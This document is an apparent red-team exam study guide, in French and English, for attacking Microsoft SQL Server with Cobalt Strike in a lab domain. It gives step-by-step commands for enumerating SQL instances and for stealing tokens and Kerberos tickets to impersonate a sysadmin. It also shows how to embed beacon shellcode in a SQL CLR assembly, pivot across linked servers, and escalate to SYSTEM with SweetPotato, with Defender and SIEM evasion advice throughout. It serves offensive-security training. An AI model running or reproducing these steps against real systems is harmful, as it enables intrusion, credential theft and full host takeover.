# Microsoft SQL Server

**Parcours :** énumérer les serveurs SQL → identifier les comptes privilégiés → vérifier le rôle `sysadmin` → étudier SQL CLR → comprendre le Lateral Movement via Linked Servers → examiner `SeImpersonatePrivilege`.

**Pourquoi SQL Server ?** Les instances SQL utilisent des comptes de service dont les droits doivent être vérifiés. SQL CLR et les Linked Servers peuvent étendre les possibilités d’exécution et de connexion entre machines.

* [Load SQL-BOF](#load-sql-bof-aggressor-script)
* [SQL Enumeration](#sql-enumeration)
* [Impersonation](#impersonation)
* [Code Execution via SQL CLR](#code-execution-via-sql-clr)
* [SQL Lateral Movement](#sql-lateral-movement)
* [SQL Privilege Escalation](#sql-privilege-escalation)

---

## Charger le script SQL-BOF Aggressor

Avant d’utiliser les commandes `sql-*`, charger le script CNA SQL-BOF :

**Cobalt Strike → Script Manager → Load → `C:\Tools\SQL-BOF\SQL\SQL.cna`**

> `OPSEC-SAFE` dans ces notes — SQL-BOF utilise des Beacon Object Files (BOF) exécutés dans le contexte du Beacon, sans lancer systématiquement un processus enfant.

---

## Énumération SQL

**Objectif :** identifier les serveurs SQL, leurs modes d’authentification et les permissions de l’utilisateur courant avant toute autre opération.

### Identifier les instances SQL avec leurs SPN

```
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
```

> `OPSEC-SAFE` dans ces notes — requête LDAP effectuée depuis la connexion au domaine du Beacon.  
> `samAccountType=805306368` identifie les comptes utilisateurs dans Active Directory. Un SPN `MSSQLSvc/hostname:port` permet d’identifier le service SQL déclaré pour Kerberos.

### Rechercher les groupes SQL et leurs membres

```
ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
```

> `OPSEC-SAFE` dans ces notes — interrogation LDAP.  
> `samAccountType=268435456` identifie les groupes de sécurité. Examiner les groupes liés à SQL et leurs membres aide à comprendre les rôles accordés sur les instances.

### Rechercher les instances SQL par port

```
portscan 10.10.120.0/23 1433 arp 1024
```

> `OPSEC-CAUTION` — un scan réseau basé sur ARP génère du trafic observable par les systèmes IDS/NDR. Vérifier les règles du lab avant de l’utiliser.

### Vérifier les informations d’une instance SQL

```
sql-1434udp 10.10.120.20       # UDP broadcast — finds instance name and version without auth
sql-info lon-db-1              # auth mode, version, linked servers, config overview
sql-whoami lon-db-1            # your current login name + role on this instance
sql-query lon-db-1 "SELECT @@SERVERNAME"   # verify which server you are connected to
```

> `OPSEC-SAFE` dans les notes — commandes SQL-BOF exécutées depuis le Beacon.  
> `sql-info` présente le mode d’authentification Windows ou SQL et l’existence éventuelle de Linked Servers.  
> `sql-whoami` indique le compte et les rôles SQL de la session, notamment `public`, `guest` ou `sysadmin`.

### Vérifier l’état de xp_cmdshell

```sql
sql-query lon-db-1 "SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"
```

> `OPSEC-CAUTION` — une requête sur `sys.configurations` peut être journalisée si l’audit SQL est activé.  
> `value=0` signifie désactivé. L’activation de `xp_cmdshell` modifie la configuration SQL et peut créer des processus enfants visibles par les outils de sécurité.

### Activer xp_cmdshell — option à risque

```
sql-enablexp lon-db-1
```

> `OPSEC-UNSAFE` dans ces notes — `xp_cmdshell` peut lancer `cmd.exe` depuis `sqlservr.exe`, ce qui est facilement observable.

---

## Impersonation

**Contexte :** `pchilds` peut disposer uniquement des rôles `public/guest`, tandis que `rsteel` possède `sysadmin` dans le lab. Les permissions SQL dépendent de l’identité authentifiée.  
Dans ce scénario, SQL Server utilise l’authentification Windows : le ticket Kerberos ou le token Windows détermine l’identité reconnue par l’instance.

### Méthode 1 — Utiliser le token d’un processus existant

> `OPSEC-SAFE` dans ces notes — manipulation du token dans le processus courant, sans création de processus enfant.

```
krb_triage                           # list all Kerberos tickets cached on this host
process_browser                      # find all running processes — look for one owned by rsteel
steal_token <pid>                    # steal rsteel's Windows access token from that process
sql-whoami lon-db-1                  # verify you now appear as rsteel with sysadmin role
```

> `krb_triage` présente les tickets accessibles et permet d’identifier les sessions qui possèdent un TGT.  
> `steal_token` duplique un token d’accès dans le Beacon. Les connexions réseau peuvent ensuite utiliser l’identité liée à ce token, selon leur contexte.  
> Après les vérifications, `rev2self` permet de revenir au contexte d’identité initial.

### Méthode 2 — Utiliser les tickets Kerberos

> `OPSEC-CAUTION` — `krb_dump` interagit avec les mécanismes de tickets Kerberos ; `make_token` crée une session de connexion de type 9 qui peut générer des événements de sécurité.

**Étape 1 — Exporter le TGT de `rsteel` :**

```
krb_triage                                          # confirm rsteel has a TGT cached in LSASS
krb_dump /user:rsteel /service:krbtgt               # extract rsteel's TGT — output is base64 kirbi
```

> `krb_dump` récupère un ticket Kerberos de la session accessible. Le TGT sert à demander des tickets de service auprès du KDC.

**Étape 2 — Demander un ticket de service MSSQLSvc :**

```
krb_asktgs /service:MSSQLSvc/lon-db-1.contoso.com:1433 /ticket:[base64-TGT-from-above]
```

> Cette demande vise le service Kerberos `MSSQLSvc/lon-db-1:1433` à l’aide du TGT indiqué.  
> Le KDC valide la demande puis délivre un ticket de service protégé par la clé du compte de service SQL.  
> Le SPN `MSSQLSvc/lon-db-1.contoso.com:1433` doit correspondre au service enregistré dans Active Directory.

**Étape 3 — Enregistrer et importer le ticket :**

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\mssql.kirbi", [Convert]::FromBase64String("[base64-ST-output]"))
```

```
make_token CONTOSO\rsteel FakePass       # create a logon session — password is irrelevant (never validated)
kerberos_ticket_use C:\Users\Attacker\Desktop\mssql.kirbi   # inject service ticket into that session
run klist                                # verify ticket appears in klist output
sql-whoami lon-db-1                      # confirm sysadmin role
```

> `make_token` crée une session `NewCredentials` de type 9. La validation des identifiants réseau intervient lors de leur utilisation, selon les mécanismes d’authentification disponibles.  
> `kerberos_ticket_use` charge le fichier `.kirbi` dans la session Kerberos du Beacon.  
> Une fois le lab terminé, supprimer le fichier `.kirbi` temporaire : `rm C:\Users\Attacker\Desktop\mssql.kirbi`

---

## Code Execution via SQL CLR

**Why:** With sysadmin access, SQL CLR (Common Language Runtime) lets you load a .NET assembly (DLL) directly into SQL Server's memory and execute arbitrary .NET code. This is far stealthier than `xp_cmdshell` because code runs *inside* `sqlservr.exe` — no child process spawned, no `cmd.exe` in the process tree.

### Step 1 — Check and enable SQL CLR

```
sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
sql-enableclr lon-db-1
```

> `OPSEC-CAUTION` — enabling CLR changes SQL Server's `sp_configure` state. This is logged in `sys.configurations` change history and may alert a SIEM if SQL config auditing is active.  
> CLR must be enabled for the server to accept and execute your assembly.

### Step 2 — Generate SMB beacon shellcode

**Payloads → Windows Stageless Payload:**
- Listener: `smb` — SMB named pipe beacon for internal lateral movement (works when direct TCP is blocked by firewalls)
- Output: `Raw` — raw shellcode bytes, no PE wrapper
- Exit Function: `Thread` — the thread exits but the SQL process stays running, avoiding crashes
- x64: ✓
- Save: `C:\Payloads\smb_x64.xthread.bin`

> `OPSEC-CAUTION` — unobfuscated shellcode embedded in the DLL may be flagged by Defender on disk. For the exam, generate via a malleable profile with sleep mask and obfuscation enabled.  
> `Thread` exit function is important — `Process` exit would kill `sqlservr.exe`, terminating the SQL service and creating a noisy crash event.

### Step 3 — Build the CLR DLL in Visual Studio

**Visual Studio → New Project → Class Library (.NET Framework) C#:**
- Project name: `MyProcedure`
- Place solution and project in same directory: ✓ (simplifies the output path)
- Framework: .NET Framework 4.7.2 (must match what SQL Server's CLR runtime supports)

**Add shellcode as embedded resource:**
1. Solution Explorer → right-click project → Add → Existing Item → select `C:\Payloads\smb_x64.xthread.bin`
2. Click the file in Solution Explorer → Properties → Build Action: **Embedded Resource**

> Embedding as a resource bundles the shellcode *inside* the DLL binary. This avoids a separate file write to disk during execution — the DLL carries its own payload.

**Critical: verify the embedded resource name in code:**

```c#
// Resource name format: <AssemblyName>.<filename>
// Must match exactly — case-sensitive, dots preserved
using (var rs = assembly.GetManifestResourceStream("MyProcedure.smb_x64.xthread.bin"))
```

> Mismatch here (`smb.x64.xthread.bin` vs `smb_x64.xthread.bin`) causes a null reference — the payload silently fails with no error. Double-check by looking at the file name in Solution Explorer.

**Build:** Switch to Release mode → Build → Build Solution  
Output DLL: `C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll`

### Step 4 — Load and execute the CLR payload on the SQL server

```
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
```

> `OPSEC-CAUTION` — SQL-BOF reads the DLL from your attacker machine, uploads it to SQL Server's CLR runtime, registers it as an unsafe assembly, creates a stored procedure (`MyProcedure`), and calls it.  
> The shellcode executes inside `sqlservr.exe` via `VirtualAlloc` + `WriteProcessMemory` + `CreateThread`. The beacon runs as the SQL service account (e.g., `NT Service\MSSQLSERVER`).  
> `TRUSTWORTHY` must be set on the database, or the assembly must be signed — `sql-clr` handles this automatically.

### Step 5 — Link to the new SMB beacon

The CLR payload created an SMB named pipe beacon inside `sqlservr.exe`. To connect to it, your beacon must present a valid CIFS/SMB service ticket for lon-db-1.

**Option A — Link from pchilds' beacon (preferred — Windows auto-requests CIFS ticket):**

```
link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

> `OPSEC-SAFE` — run this from the original pchilds medium-integrity beacon. Windows automatically uses pchilds' cached TGT to request a `cifs/lon-db-1` service ticket from the KDC, then authenticates the SMB named pipe connection. No manual ticket work.  
> The TSVCPIPE name is defined in your CS SMB listener configuration. Hit TAB to autocomplete if you forget it.

**Option B — Manually request CIFS ticket (when running from an impersonated/no-TGT context):**

```
krb_asktgs /service:cifs/lon-db-1.contoso.com /ticket:[rsteel-TGT-base64]
```

```powershell
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\cifs.kirbi", [Convert]::FromBase64String("[base64-output-from-above]"))
```

```
kerberos_ticket_use C:\Users\Attacker\Desktop\cifs.kirbi
run klist                                                      # confirm cifs/lon-db-1 ticket present
link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

> `OPSEC-CAUTION` — .kirbi file written to disk. Delete after linking: `rm C:\Users\Attacker\Desktop\cifs.kirbi`  
> Use Option B when your current beacon context (e.g. an impersonated token session that lacks a valid TGT) cannot auto-request CIFS tickets.  
> **Why CIFS specifically:** SMB named pipe authentication uses the CIFS service class, not MSSQLSvc. You need a separate ticket for the link step.

### Step 6 — Disable CLR after use

```
sql-disableclr lon-db-1
```

> `OPSEC-SAFE` — clean up. Reverting CLR to disabled reduces your footprint and removes the exploitation path for defenders reviewing SQL config after the fact.

---

## SQL Lateral Movement

**Why:** SQL Server linked server relationships allow one SQL instance to query another on your behalf. If the link runs with sysadmin credentials on the downstream server, you can execute CLR payloads there without needing direct network access from your attacker machine. This is how you reach SQL servers in network segments blocked from your attacker host.

### Enumerate links and verify downstream privileges

```
sql-links lon-db-1                          # show all linked servers configured on lon-db-1
sql-whoami lon-db-1 "" lon-db-2             # check your privilege level on lon-db-2 via the link
```

> `OPSEC-SAFE` — BOF-based queries, no child process.  
> The `""` second argument means no intermediate hop — direct link query from lon-db-1 to lon-db-2.  
> If you see `sysadmin` on lon-db-2 via the link, the link is configured with elevated credentials and is exploitable.

### Enable RPC Out on the link (required for CLR execution)

```
sql-checkrpc lon-db-1                       # query current RPC Out status on all links
sql-enablerpc lon-db-1 lon-db-2             # enable RPC Out on the link to lon-db-2
```

> `OPSEC-CAUTION` — modifying link configuration is logged in SQL Server error log and visible in `sys.servers`.  
> **Why RPC Out is needed:** `EXECUTE AT linked_server` (which is how SQL-BOF executes CLR remotely) requires RPC Out to be enabled on the link. Without it, you can query data but cannot execute stored procedures on the remote server.

### Execute CLR payload on lon-db-2 via the link

```
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
```

> `OPSEC-CAUTION` — same CLR injection as before, but tunneled through the lon-db-1 → lon-db-2 SQL link.  
> The fourth argument `""` = no intermediate, fifth argument `lon-db-2` = target linked server.  
> The beacon executes inside `sqlservr.exe` on lon-db-2, running as that server's MSSQL service account.

### Link to the new beacon on lon-db-2 (run from lon-db-1's beacon)

```
link lon-db-2 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

> `OPSEC-SAFE` — SMB named pipe connection from lon-db-1 to lon-db-2.  
> **Critical: run this command from the lon-db-1 beacon, not the attacker machine.**  
> **Why:** lon-db-2 may be on a separate network segment with firewall rules blocking direct attacker-to-lon-db-2 SMB traffic. lon-db-1 is network-adjacent to lon-db-2 (the SQL link already proves connectivity). By linking from lon-db-1's beacon, you build a chain: `Attacker CS → lon-db-1 beacon → lon-db-2 beacon`.  
> The lon-db-1 beacon runs as the MSSQL service account, which has CIFS access to lon-db-2 (same account that drives the SQL link).

### Disable RPC after use

```
sql-disablerpc lon-db-1 lon-db-2
```

> `OPSEC-SAFE` — clean up. Revert RPC Out to reduce footprint.

---

## SQL Privilege Escalation

**Why:** The MSSQL service account running your beacon has `SeImpersonatePrivilege` by design — SQL Server requires it to impersonate client connections. This privilege lets a local service account impersonate any user (including SYSTEM) via Windows COM/DCOM authentication coercion. SweetPotato exploits this.

### Identify the privilege

```
whoami /priv    # BOF - check token privileges
```

> Look for `SeImpersonatePrivilege: Enabled`.  
> The MSSQL service account (`NT Service\MSSQLSERVER`) always holds this privilege — it is granted by Windows as part of service account setup, not misconfiguration.

### Generate TCP-local payload (SYSTEM beacon)

**Payloads → Windows Stageless Payload:**
- Listener: `tcp-local` — binds only to `127.0.0.1`, no external network exposure
- Output: Windows EXE
- Exit Function: Process
- x64: ✓
- Save: `C:\Payloads\tcp-local_x64.exe`

> `tcp-local` is necessary because lon-db-2 may have no inbound firewall path back to your team server. The beacon connects locally and you reach it via the existing beacon chain (attacker → lon-db-1 → lon-db-2 → SYSTEM beacon on lon-db-2).

### Upload payload to a less-monitored directory

```
cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
pwd
upload C:\Payloads\tcp-local_x64.exe
```

> `OPSEC-CAUTION` — file write to disk.  
> **Why this directory:** The MSSQL service account owns its own service profile. `WindowsApps` within that profile is writable by the service account and less aggressively scanned by Defender compared to `C:\Windows\Temp` or `C:\Users\Public`. For the exam, generate a custom artifact to avoid static Defender signatures on the EXE.

### Exploit SeImpersonatePrivilege with SweetPotato

```
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
```

> `OPSEC-CAUTION` — `execute-assembly` uses fork & run (spawns a sacrificial process). SweetPotato creates a fake COM server, coerces a privileged Windows service to authenticate to it via DCOM, captures the SYSTEM token, then runs your payload under that token.  
> The result: your EXE runs as `NT AUTHORITY\SYSTEM`.  
> For the exam: ensure `spawnto` is set to a non-signatured binary in your malleable profile (`post-ex { set spawnto_x64 "%windir%\\sysnative\\dllhost.exe"; }`).

### Connect to the SYSTEM beacon

```
connect localhost 1337
```

> `OPSEC-SAFE` — loopback TCP connection from lon-db-2's MSSQL beacon to the newly spawned SYSTEM beacon on the same host. No external network traffic.  
> Port `1337` is defined in your `tcp-local` listener configuration.

New beacon spawned as `NT AUTHORITY\SYSTEM` on lon-db-2.
